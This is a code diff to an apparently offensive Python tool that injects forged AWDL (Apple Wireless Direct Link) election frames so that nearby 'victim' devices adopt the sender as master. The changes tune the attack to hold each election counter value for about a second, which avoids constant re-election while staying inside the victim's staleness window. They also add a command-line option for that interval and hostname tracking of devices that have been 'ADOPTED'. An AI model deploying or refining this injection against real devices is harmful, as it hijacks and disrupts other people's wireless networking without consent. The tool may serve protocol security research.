@@ -166,6 +166,12 @@ PSF_INTERVAL_MASTER_TU = 110
 UINT32_MAX = 0xFFFFFFFF
 MASTER_COUNTER_BASE = 0x40000000  # start high; advance so the master stays live
 MASTER_COUNTER_STEP = 1
+# Advance the counter on a timer, not per frame: every frame carrying a *new*
+# counter value is treated by the victim as a fresh master generation and only
+# settles after it has seen that value repeated, so bumping every frame keeps it
+# perpetually re-electing. Holding each value for ~1 s (many frames) is still far
+# inside the ~10 s staleness window that would mark the master dead.
+MASTER_COUNTER_INTERVAL = 1.0     # seconds between counter increments
 
 BROADCAST = b"\xff\xff\xff\xff\xff\xff"
 
@@ -571,7 +577,7 @@ class ParamStore:
                         the radio on the next cycle (single-channel mode)
         master_metric   election master metric (compared second, higher wins)
         master_counter  election master counter (compared first, higher wins);
-                        advanced automatically every frame to stay "live"
+                        advanced automatically over time to stay "live"
         self_metric     own metric advertised in the election TLVs
         self_counter    own counter advertised in the election TLVs
         awdl_version    Version TLV byte, e.g. 0xa0 for 10.0
@@ -618,8 +624,9 @@ class ParamStore:
         """Atomically bump the election counters so the master stays "live".
 
         A frozen counter is detected by the victim as a stale (dead) master, so
-        the loop advances it every frame.  ``self_counter`` is kept in lock-step
-        with ``master_counter``.  Returns the new counter value.
+        the loop advances it on a timer (see ``counter_interval``).
+        ``self_counter`` is kept in lock-step with ``master_counter``.  Returns
+        the new counter value.
         """
         with self._lock:
             new = min(self._v["master_counter"] + step, maximum)
@@ -833,8 +840,13 @@ def poll_rx(sock, our_src, watch_state=None, tracker=None):
                     changes.append(change)
             if watch_state is not None and maddr is not None \
                     and bytes(psrc) != bytes(our_src):
-                watch_state[mac_str(psrc)] = (mac_str(maddr), sctr,
-                                              time.monotonic())
+                key = mac_str(psrc)
+                prev = watch_state.get(key)
+                # Carry the last-known hostname forward: it rides in MIFs but
+                # not in every frame, so keep it if this frame didn't carry one.
+                name = hostname if hostname is not None \
+                    else (prev[3] if prev else None)
+                watch_state[key] = (mac_str(maddr), sctr, time.monotonic(), name)
     finally:
         sock.setblocking(True)
     return changes
@@ -845,13 +857,14 @@ def watch_report(state, our_src_str):
     now = time.monotonic()
     to_delete = []
     for peer in sorted(state):
-        maddr, sctr, seen = state[peer]
+        maddr, sctr, seen, name = state[peer]
         if now - seen > 15:
             to_delete.append(peer)
             continue
+        who = "%s (%s)" % (peer, name) if name else peer
         tag = "  <== ADOPTED YOU" if maddr == our_src_str else ""
         print("    [watch] %s -> master %s (self_counter=%s)%s"
-              % (peer, maddr, sctr, tag))
+              % (who, maddr, sctr, tag))
     for peer in to_delete:
         del state[peer]
 
@@ -944,7 +957,9 @@ def prepare_stick(ifname, regdomain="US", channel=None):
 def run_injection(sock, store, builder, ifname, interval=1.0, duration=0,
                   count=0, psf=False, watch=False, rotate_channels=None,
                   channel_dwell=CHANNEL_DWELL_DEFAULT,
-                  counter_step=MASTER_COUNTER_STEP, stop=None, tracker=None):
+                  counter_step=MASTER_COUNTER_STEP,
+                  counter_interval=MASTER_COUNTER_INTERVAL,
+                  stop=None, tracker=None):
     """Inject AWDL MIF frames, reading every live parameter from ``store``.
 
     This is the reusable core of the tool.  Before building each frame it pulls
@@ -990,6 +1005,7 @@ def run_injection(sock, store, builder, ifname, interval=1.0, duration=0,
     ci = 0
     current_channel = None
     next_switch = time.monotonic() + channel_dwell
+    next_counter_bump = time.monotonic() + counter_interval
 
     while not stop.is_set():
         # Advance the channel rotation once the dwell on the current one is up.
@@ -1026,8 +1042,12 @@ def run_injection(sock, store, builder, ifname, interval=1.0, duration=0,
                 else:
                     dropped += 1
 
-        # keep the master "live": advance the counter so it is never stale
-        store.advance_counter(counter_step, UINT32_MAX)
+        # keep the master "live": advance the counter on a timer (not per frame,
+        # which would make the victim re-elect on every frame) but well within
+        # the staleness window
+        if counter_interval <= 0 or time.monotonic() >= next_counter_bump:
+            store.advance_counter(counter_step, UINT32_MAX)
+            next_counter_bump = time.monotonic() + counter_interval
 
         if watch or tracker is not None:
             changes = poll_rx(sock, snap["source"],
@@ -1112,8 +1132,14 @@ def main(argv=None):
                         help="election master metric (default: 0xffffffff = max)")
     parser.add_argument("--counter", type=lambda x: int(x, 0),
                         default=MASTER_COUNTER_BASE,
-                        help="starting election master counter; advances every "
-                             "frame so the master stays live (default 0x40000000)")
+                        help="starting election master counter; advances over "
+                             "time so the master stays live (default 0x40000000)")
+    parser.add_argument("--counter-interval", type=parse_duration,
+                        default=MASTER_COUNTER_INTERVAL, metavar="TIME",
+                        help="how often the election counter is advanced "
+                             "(s/ms/us/tu suffix; default 1s). Advancing per "
+                             "frame makes the victim re-elect on every frame, so "
+                             "each counter value is held for this long; 0 = never")
     parser.add_argument("--awdl-version", type=parse_awdl_version,
                         default=AWDL_VERSION_TLV_DEFAULT, metavar="VER",
                         help="AWDL version advertised in the Version TLV, e.g. "
@@ -1330,7 +1356,8 @@ def main(argv=None):
             sock, store, builder, args.interface,
             interval=args.interval, duration=args.duration, count=args.count,
             psf=args.psf, watch=args.watch, rotate_channels=rotate_channels,
-            channel_dwell=args.channel_dwell, stop=stop, tracker=tracker,
+            channel_dwell=args.channel_dwell,
+            counter_interval=args.counter_interval, stop=stop, tracker=tracker,
         )
     finally:
         sock.close()
